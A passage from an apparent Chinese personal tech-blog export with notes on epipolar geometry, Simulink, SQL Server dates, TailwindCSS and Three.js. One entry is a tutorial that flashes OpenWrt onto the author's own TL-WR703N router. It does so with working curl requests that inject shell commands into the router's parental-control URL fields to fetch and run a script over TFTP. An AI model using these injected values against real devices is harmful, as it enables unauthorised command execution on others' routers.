<h1 id="对极几何"><a href="#对极几何" class="headerlink" title="对极几何"></a>对极几何</h1><p>两个相机在不同位置拍摄同一物体，两张照片中的景物有重叠部分，那么理论上这两张照片会存在一定的对应关系，而对极几何就是探索描述它们之间对应关系的工具。相机在不同位置拍摄同一物体示意图如图1所示。</p>
<p align="center">
    <img src="images/epipolor1.png" width="90%" alt="相机在不同位置拍摄同一物体示意图"/>
</p>
<center>图1  相机在不同位置拍摄同一物体示意图</center>

<p>图中的概念有：</p>
<ul>
<li><p>极点e：分别是左边相机中心在右图像平面上的像，右相机中心在左像平面上的像。</p>
</li>
<li><p>极平面：两个相机中心和空间中某店p形成的平面。</p>
</li>
<li><p>极线l：极平面分别和两个像平面的交线。</p>
</li>
</ul>
<p>对极几何则是描述这几个量之间的对应关系。直观讲，从左图的角度看，如果不知道p点的深度信息，射线op是这个点可能出现的空间位置，因为该射线上的点都会投影到同一个像素点，同时，如果不知道p点的具体位置，那么当在右图的位置看时，极线 l’ 就是点p可能出现的位置，即在这条线上的某个地方。如图2所示:</p>
<p align="center">
    <img src="images/epipolor2.png" width="90%" alt="物体位置示意图"/>
</p>
<center>图2  物体位置示意图</center>

<p>在计算机视觉中，基础矩阵（Fundamental matrix） F 是一个3×3的矩阵，表达了立体像对的像点之间的对应关系。在对极几何中，对于立体像对中的一对同名点，它们的齐次化图像坐标分别为 $p$ 与 $p’$， ${\displaystyle \mathrm {F} p}$ 表示一条必定经过 $p’$的直线（极线）。这意味着立体像对的所有同名点对都满足：</p>
<p>$${\displaystyle p’^{\top }\mathrm {F} p=0.}$$</p>
<p>F矩阵中蕴含了立体像对的两幅图像在拍摄时相互之间的空间几何关系（外参数）以及相机检校参数（内参数），包括旋转、位移、像主点坐标和焦距。因为 F 矩阵的秩为2，并且可以自由缩放（尺度化），所以只需7对同名点即可估算出F的值。</p>
<p>基础矩阵这一概念由Q. T. Luong在他那篇很有影响力的博士毕业论文中提出。Faugeras则是在1992年发表的著作中以上面的关系式给出了 F 矩阵的定义。尽管Longuet-Higgins提出的本质矩阵也满足类似的关系式，但本质矩阵中并不蕴含相机检校参数。本质矩阵与基础矩阵之间的关系可由下式表达：</p>
<p>$$ {\displaystyle \mathrm {E} =\mathrm {K’^{\top }} \mathrm {FK} .}$$</p>
<p>其中 $K$和 $K’$分别为两个相机的内参数矩阵。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://zhaoxuhui.top/blog/2018/03/22/MathInSLAM.html" target="_blank" rel="noopener">SLAM数学基础</a>,by zhaoxuhui.</li>
<li><a href="https://zh.wikipedia.org/wiki/即时定位与地图构建" target="_blank" rel="noopener">即时定位与地图构建</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/23247395" target="_blank" rel="noopener">大牛讲堂｜SLAM第一篇：基础知识</a>, by 地平线HorizonRobotics.</li>
<li><a href="https://www.zhihu.com/question/35186064" target="_blank" rel="noopener">学习SLAM需要哪些预备知识？</a>,by wikipedia.</li>
<li><a href="http://cvrs.whu.edu.cn/downloads/ebooks/计算机视觉中的数学方法.pdf" target="_blank" rel="noopener">计算机视觉中的数学方法</a>,by 吴福朝.</li>
<li><a href="https://blog.csdn.net/u012936940/article/details/80723609" target="_blank" rel="noopener">对极几何及单应矩阵</a>, by Rap_God.<br>​</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink用户自定义函数</title>
    <url>/2020/04/16/Simulink%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在使用Simulink建模过程中，发现没有想要的模块，于是只能使用Simulink的自定义函数模块拓展其功能。Simulink自定义函数模块可分成：</p>
<ul>
<li>matlab函数</li>
<li>matlab系统</li>
<li>Simulink函数</li>
<li>S函数</li>
<li>初始化函数</li>
<li>重设函数</li>
<li>终止函数</li>
</ul>
<h1 id="S函数的类型"><a href="#S函数的类型" class="headerlink" title="S函数的类型"></a>S函数的类型</h1><ul>
<li>S函数有多种类型，按照语言分类有M、C、C++、Fortran等编写的；</li>
<li>按照所支持功能多少分类，包括Level1和Level2；</li>
<li>按照执行方式分类，可分为直接解释运行的M S函数和编译为Mex文件后执行的C Mex S函数。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.mathworks.com/help/simulink/user-defined-functions.html?s_tid=CRUX_lftnav" target="_blank" rel="noopener">User-Defined Functions</a>,by mathwork.</li>
<li><a href="https://zhuanlan.zhihu.com/p/57487483" target="_blank" rel="noopener">Simulink用得多了，不知道sim()函数你又知多少？</a>,by 尘世落尘.</li>
<li><a href="https://www.cnblogs.com/dingdangsunny/p/12248471.html" target="_blank" rel="noopener">Simulink仿真入门到精通（十） S函数</a>,by 叮叮当当sunny.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink模型支持可变尺寸信号的方法</title>
    <url>/2020/04/14/Simulink%E6%A8%A1%E5%9E%8B%E6%94%AF%E6%8C%81%E5%8F%AF%E5%8F%98%E5%B0%BA%E5%AF%B8%E4%BF%A1%E5%8F%B7%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>使用Simulink建模的过程中，需要输入或输出可变尺寸的信号，具体方法主要有三种：</p>
<ul>
<li><p>具有不同输入端口的开关或多端口开关块，具有不同大小的固定大小信号，其输出是一个可变大小的信号。</p>
</li>
<li><p>选择器块和起始和结束索引（端口）索引选项。索引端口信号可以指定输入数据信号的不同子区域，这些子区域在模拟过程中产生可变大小的输出信号。</p>
</li>
<li><p>具有为可变大小信号配置的输出端口的S函数块。输出不仅包括信号的值，还包括信号的维数。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.mathworks.com/help/simulink/ug/variable-size-signal-basics.html" target="_blank" rel="noopener">Variable-Size Signal Basics</a>,by mathworks.</li>
<li><a href="https://www.mathworks.com/help/simulink/ug/simulink-models-using-variable-size-signals-demos-modeling-features-variable-size-signals-or-type-varsizedemos-.html" target="_blank" rel="noopener">Inspect Variable-Size Signals on Simulink Models</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLServer2008中日期类型数据的存储</title>
    <url>/2019/10/13/SQLServer2008%E4%B8%AD%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AD%98%E5%82%A8/</url>
    <content><![CDATA[<h1 id="日期类型比较"><a href="#日期类型比较" class="headerlink" title="日期类型比较"></a>日期类型比较</h1><p>SQL Server 2008中有datetime、datetime2、datetimeoffset三种数据类型用于存储时间类型数据。它们之间的差别主要有：</p>
<ul>
<li>datetime、datetime2不存储时区信息，datetimeoffset存储时区信息。</li>
<li>datetime与datetime2区别是两者存储字节大小和精度不同，后者优于前者。</li>
</ul>
<p>因此，在存储时间信息时，优先使用datetimeoffset数据类型。当使用datetime和datetime2数据类型时，因没有时区信息，很多客户端链接库会将存储的时间默认为UTC时间。例如：</p>
<p>SQL Server2008中存储某人的出生日期为“1970-01-01 00:00:00”，通过sequelizejs框架读取得到出生日期将是“1970-01-01T00:00:00Z”，<strong>这里 T 仅仅是分隔日期和时间的符号，没有其他含义，而 Z 表示 UTC 时间。</strong></p>
<p>这时需要根据自己所在时区对时间进行修正。最简单的方法是在SQL语句中进行修正，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select birthday1, dateadd(hour,-8,birthday) from students</span><br></pre></td></tr></table></figure>
<h1 id="日期转换"><a href="#日期转换" class="headerlink" title="日期转换"></a>日期转换</h1><p>有时时间会以字符串类型存储在数据库中，当需要对时间进行比较时，需要先将字符串类型时间转换成日期类型，可使用convert函数进行转换，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 字符串转日期</span><br><span class="line">select convert(date, &#39;2005-12-31 23:59:59.9999999&#39;)</span><br><span class="line"># 日期转字符串</span><br><span class="line">select convert(varchar, getdate(), 1)</span><br></pre></td></tr></table></figure>

<p>其中date是要转换的数据的类型，’2005-12-31 23:59:59.9999999’是被转换的数据。</p>
<h1 id="日期比较"><a href="#日期比较" class="headerlink" title="日期比较"></a>日期比较</h1><p>在mssql中比较两个日期的大小，可采用DATEDIFF函数，其语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DATEDIFF ( datepart , startdate , enddate )</span><br></pre></td></tr></table></figure>

<p>其中，datepart是时间单位，startdate和enddate是合法的日期表达式。datediff用法示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT DATEDIFF(year,        &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(quarter,     &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(month,       &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(dayofyear,   &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(day,         &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(week,        &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(hour,        &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(minute,      &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(second,      &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(millisecond, &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br><span class="line">SELECT DATEDIFF(microsecond, &#39;2005-12-31 23:59:59.9999999&#39;, &#39;2006-01-01 00:00:00.0000000&#39;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/18518290/how-to-add-hours-to-current-date-in-sql-server/18518412" target="_blank" rel="noopener">How to add hours to current date in SQL Server?</a>,by stackoverflow.</li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/datetime/choosing-between-datetime" target="_blank" rel="noopener">Choosing between DateTime, DateTimeOffset, TimeSpan, and TimeZoneInfo</a>,by microsoft.</li>
<li><a href="https://blog.csdn.net/happymagic/article/details/45065321" target="_blank" rel="noopener">datetime、datetime2的区别</a>,by happymagic.</li>
<li><a href="https://www.cnblogs.com/Gin-23333/p/5066823.html" target="_blank" rel="noopener">DateTime , DateTime2 ,DateTimeOffset 之间的小区别</a>,by 神崎橙.</li>
<li><a href="https://segmentfault.com/a/1190000004292140" target="_blank" rel="noopener">关于“时间”的一次探索</a>,by KohPoll.</li>
<li><a href="https://www.mssqltips.com/sqlservertip/1145/date-and-time-conversions-using-sql-server/" target="_blank" rel="noopener">Date and Time Conversions Using SQL Server</a>,by Edgewood Solutions.</li>
<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/datediff-transact-sql?view=sql-server-ver15" target="_blank" rel="noopener">DATEDIFF (Transact-SQL)</a>,by microsoft.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink模块参数在线修改方法</title>
    <url>/2020/08/14/Simulink%E6%A8%A1%E5%9D%97%E5%8F%82%E6%95%B0%E5%9C%A8%E7%BA%BF%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Simulink在建立系统模型方面非常的便捷，利用其提供的各种已封装好的组件，可以很快地构建各种模型，如飞机、导弹、诱饵弹等。但是在将导弹、诱饵弹装配到飞机上时就比较复杂了。例如，在飞机发射导弹时，如何将飞机的速度、位姿状态传递给导弹模型就是一个难题。为解决该难题，Simulink必须能够在线修改模型的参数。幸运的是，尽管比较艰难，通过一些特殊的技巧，Simulink还是能够实现在线修改模型参数的。具体的解决方案如下：</p>
<ul>
<li><p>模型实例化问题。以飞机携带多枚导弹为例，因为飞机携带导弹数量有限，可以直接生成多个导弹模块。如果数量实在太多，可以考虑for each subsystem。</p>
</li>
<li><p>在线修改模型参数问题。利用Simulink的s函数，在Update函数中使用set_param函数修改模型参数。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Update(block)</span><br><span class="line">    decoyID&#x3D;block.DialogPrm(1).Data; </span><br><span class="line">    decoyName&#x3D;sprintf(&#39;%s%d&#39;,&#39;JetFlighterWithDecoy&#x2F;Decoys&#x2F;Decoy&#39;,decoyID);</span><br><span class="line"></span><br><span class="line">    % 脉冲信号上升沿触发，设置模型参数</span><br><span class="line">    if(block.InputPort(4).Data&#x3D;&#x3D;1 &amp;&amp; block.Dwork(1).Data&#x3D;&#x3D;0)</span><br><span class="line">        fligherSpeed&#x3D;block.InputPort(2).Data;</span><br><span class="line">        decoySpeed&#x3D;[fligherSpeed(1) fligherSpeed(2) fligherSpeed(3)-30];</span><br><span class="line">        dcm&#x3D;block.InputPort(3).Data;</span><br><span class="line">        docoySpeedInFlatEarth&#x3D;inv(dcm)*decoySpeed&#39;;</span><br><span class="line">        v0&#x3D;join([&#39;[&#39; string(docoySpeedInFlatEarth&#39;) &#39;]&#39;]);</span><br><span class="line">        pos0&#x3D;join([&#39;[&#39; string(block.InputPort(1).Data&#39;) &#39;]&#39;]);</span><br><span class="line">        set_param(decoyName,&#39;ParameterArgumentValues&#39;,struct(&#39;decoySpeed&#39;,char(v0),&#39;decoyPos&#39;,char(pos0)));</span><br><span class="line">        block.Dwork(1).Data &#x3D; 1;%使能信号</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=JSJZ200412066&dbcode=CJFD&dbname=CJFD2004" target="_blank" rel="noopener">Simulink模块参数在线修改方法的研究</a>,by 郑志波.</li>
<li><a href="https://www.mathworks.com/matlabcentral/answers/420930-why-do-i-get-an-error-when-specifying-a-simscape-component-parameter-with-same-name-as-built-in-simu" target="_blank" rel="noopener">Why do I get an error when specifying a Simscape component parameter with same name as built-in Simulink parameter?</a>,by mathworks.</li>
<li><a href="https://www.mathworks.com/help/simulink/ug/parameterize-referenced-models.html" target="_blank" rel="noopener">Parameterize Instances of a Reusable Referenced Model</a>,by mathworks.</li>
<li><a href="https://ww2.mathworks.cn/help/simulink/slref/find_system.html" target="_blank" rel="noopener">find_system</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink的强化学习代理开始无输出结果的解决方法</title>
    <url>/2021/11/14/Simulink%E7%9A%84%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%90%86%E5%BC%80%E5%A7%8B%E6%97%A0%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Simulink进行强化学习代理训练时，出现如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Derivative of state &#39;2&#39; in block &#39;physicalModel&#x2F;Nonlinear Second-Order Actuator&#x2F;Integrator, Second-Order</span><br><span class="line">    Limited&#39; at time 0.0 is not finite. The simulation will be stopped. There may be a singularity in the solution.  If not, try reducing the step size</span><br><span class="line">    (either by reducing the fixed step size or by tightening the error tolerances)</span><br></pre></td></tr></table></figure>
<p>经过分析，导致该错误的原因是产生强化学习代理初始输入信号的Memory模块的初始值设为inf导致的。解决方法是修改Memory模块的初始值。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/weixin_46338425/article/details/119716503" target="_blank" rel="noopener">Simulink扩展卡尔曼滤波输出无结果的解决</a>,by 渣渣丰.</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>TailwindCSS学习笔记</title>
    <url>/2022/10/04/TailwindCSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>在前端网页设计中，美工给的设计稿的宽度和高度是固定的，但显示设备的像素是多变的，因此需要响应式设计。</p>
<p>由于最新的tailwind css使用post css 8版本，vue2框架暂时还不支持，所以需要指定安装postcss7的版本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install tailwindcss@npm:@tailwindcss&#x2F;postcss7-compat @tailwindcss&#x2F;postcss7-compat postcss@^7 autoprefixer@^9</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/337939566" target="_blank" rel="noopener">如何评价CSS框架TailwindCSS？</a>,by zhihu.</li>
<li><a href="https://blog.csdn.net/vx_1097122362/article/details/115563641" target="_blank" rel="noopener">超简单！怎样在Vue2中使用TailWind Css</a>,by vx_1097122362.</li>
<li><a href="https://stackoverflow.com/questions/64925926/error-postcss-plugin-tailwindcss-requires-postcss-8" target="_blank" rel="noopener">Error: PostCSS plugin tailwindcss requires PostCSS 8</a>,by stackoverflow.</li>
<li><a href="http://xfyuan.github.io/2021/04/the-foundation-of-how-tailwindcss-works/" target="_blank" rel="noopener">Tailwindcss底层基石的理念</a>,by xfyuan.</li>
<li><a href="https://www.51cto.com/article/695931.html" target="_blank" rel="noopener">TailwindCSS v3.0 正式发布！一大波新特性来袭！</a>,by 一只图雀.</li>
<li><a href="https://www.jianshu.com/p/ff03b969b724" target="_blank" rel="noopener">element-ui的响应式布局</a>,by Rackar.</li>
<li><a href="https://blog.csdn.net/Couth_/article/details/112197365" target="_blank" rel="noopener">关于Element UI响应式布局问题</a>,by Huanlis.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>TL-WR703N版本v1.7刷openwrt教程</title>
    <url>/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
<li>一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在刷机之前，按reset按钮重置路由器</span><br></pre></td></tr></table></figure></li>
<li>TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）</span><br><span class="line">curl https:&#x2F;&#x2F;downloads.openwrt.org&#x2F;snapshots&#x2F;trunk&#x2F;ar71xx&#x2F;generic&#x2F;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i1 bs&#x3D;1 count&#x3D;1048576</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i2 bs&#x3D;1 skip&#x3D;1048576</span><br></pre></td></tr></table></figure></li>
<li>TFTP 服务器<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装TFTP的客户端和服务器端</span><br><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure></li>
<li>busybox 1.16.1 MIPS 版<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;binaries&#x2F;1.21.1&#x2F;busybox-mips &gt; busybox</span><br></pre></td></tr></table></figure></li>
<li>编写Hack脚本<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">tftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的ip</span><br><span class="line">tftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来</span><br><span class="line">tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来</span><br><span class="line">chmod 755 busybox  # 修改busybox权限以执行命令</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i1 of&#x3D;&#x2F;dev&#x2F;mtdblock1 conv&#x3D;fsync # 将i1写入磁盘分区</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i2 of&#x3D;&#x2F;dev&#x2F;mtdblock2 conv&#x3D;fsync # 将i2写入磁盘分区</span><br><span class="line">reboot -f # 重启，会启动openwrt</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h1><p>在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。</p>
<h2 id="搭建tftp服务器"><a href="#搭建tftp服务器" class="headerlink" title="搭建tftp服务器"></a>搭建tftp服务器</h2><p>在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。</p>
<h2 id="Hack-into-TL-WR703N"><a href="#Hack-into-TL-WR703N" class="headerlink" title="Hack into TL-WR703N"></a>Hack into TL-WR703N</h2><p>这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。</p>
<blockquote>
<p>【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。</p>
</blockquote>
<p>步骤如下：</p>
<ul>
<li><p>长按reboot按钮将路由器恢复出厂设置</p>
</li>
<li><p>将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100</p>
</li>
<li><p>在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 此处修改密码为admin42，注意Cookies中认证变量Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;true&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;&#39;</span><br></pre></td></tr></table></figure>
</li>
<li><p>启用家长控制（利用漏洞）</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?ctrl_enable&#x3D;1&amp;parent_mac_addr&#x3D;00-00-00-00-00-02&amp;Page&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>让路由器从tftp服务器下载并执行脚本<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?Modify&#x3D;0&amp;Page&#x3D;1&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?child_mac&#x3D;00-00-00-00-00-01&amp;lan_lists&#x3D;888&amp;url_comment&#x3D;test&amp;url_0&#x3D;;cd%20&#x2F;tmp;&amp;url_1&#x3D;;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2&#x3D;;sh%20aa;&amp;url_3&#x3D;&amp;url_4&#x3D;&amp;url_5&#x3D;&amp;url_6&#x3D;&amp;url_7&#x3D;&amp;scheds_lists&#x3D;255&amp;enable&#x3D;1&amp;Changed&#x3D;1&amp;SelIndex&#x3D;0&amp;Page&#x3D;1&amp;rule_mode&#x3D;0&amp;Save&#x3D;%B1%A3+%B4%E6&#39;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="openwrt系统配置"><a href="#openwrt系统配置" class="headerlink" title="openwrt系统配置"></a>openwrt系统配置</h1><p>openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cubicpill.me/2018/03/17/wr703n-openwrt.html" target="_blank" rel="noopener">给 v1.7 版本的 TL-WR703N 刷 openwrt</a>,by Cubic Zone.</li>
<li><a href="https://juejin.im/entry/5a2f92df6fb9a0450d110c14" target="_blank" rel="noopener">TL-WR703N v1.7刷openwrt</a>,by 梦里茶.</li>
<li><a href="https://openwrt.org/toh/tp-link/tl-wr703n" target="_blank" rel="noopener">TP-Link TL-WR703N</a>,by openwrt.</li>
<li><a href="https://huangwang.github.io/2018/12/30/Debian安装配置使用TFTP/">Debian安装配置使用TFTP</a>,by jack huang.</li>
<li><a href="https://www.practicalnetworking.net/series/packet-traveling/packet-traveling/" target="_blank" rel="noopener">Packet Traveling</a>,by ed harmoush.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Threejs学习笔记</title>
    <url>/2023/03/23/Threejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Three.js是一个跨浏览器的 JavaScript 库和应用程序编程接口(API)，用于使用WebGL在Web 浏览器中创建和显示动画3D 计算机图形。</p>
<p>Three.js 允许使用JavaScript语言创建图形处理单元(GPU) 加速的 3D 动画作为网站的一部分，而无需依赖专有浏览器插件。</p>
<h1 id="Three-js入门教程"><a href="#Three-js入门教程" class="headerlink" title="Three.js入门教程"></a>Three.js入门教程</h1><p>请参考<a href="https://www.cnblogs.com/wjw1014/p/16825565.html" target="_blank" rel="noopener">一篇文章了解 threejs 在 vue 项目中的基本使用</a>。</p>
<h1 id="three-js-动画系统"><a href="#three-js-动画系统" class="headerlink" title="three.js 动画系统"></a>three.js 动画系统</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://threejs.org/docs/#examples/zh/controls/OrbitControls" target="_blank" rel="noopener">轨道控制器（OrbitControls）</a>,by threejs.</li>
<li><a href="https://www.cnblogs.com/wjw1014/p/16825565.html" target="_blank" rel="noopener">一篇文章了解 threejs 在 vue 项目中的基本使用</a>,by wjw1014.</li>
<li><a href="https://juejin.cn/post/7050283069743300638" target="_blank" rel="noopener">用封装好的threejs库快速生成全景-Panolens.js</a>,by 乘风转舵.</li>
<li><a href="https://juejin.cn/post/6974225941224488967" target="_blank" rel="noopener">关于梳理封装Threejs工具类这档事</a>,by FlyTeng_1874.</li>
<li><a href="https://blog.csdn.net/ithanmang/article/details/80793728" target="_blank" rel="noopener">Three.js - 监听window 的 resize 事件，使浏览器窗口变动自适应</a>,by 已注销.</li>
<li><a href="https://stackoverflow.com/questions/43813731/how-to-trigger-an-event-when-element-is-resized-in-vue-js" target="_blank" rel="noopener">How to trigger an event when element is resized in Vue.js?</a>,by stackoverflow.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Resize_Observer_API" target="_blank" rel="noopener">Resize Observer API</a>,by mozilla.</li>
